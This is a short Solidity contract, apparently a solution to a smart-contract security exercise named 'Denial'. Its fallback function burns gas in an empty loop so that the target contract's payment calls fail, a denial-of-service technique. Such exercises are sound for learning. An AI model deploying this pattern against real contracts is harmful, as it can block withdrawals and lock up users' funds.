// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";
import "hardhat/console.sol";

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    //Code me!
    fallback() external payable {
        for (uint256 i = 0; i < 100000; i++) {}
    }
}
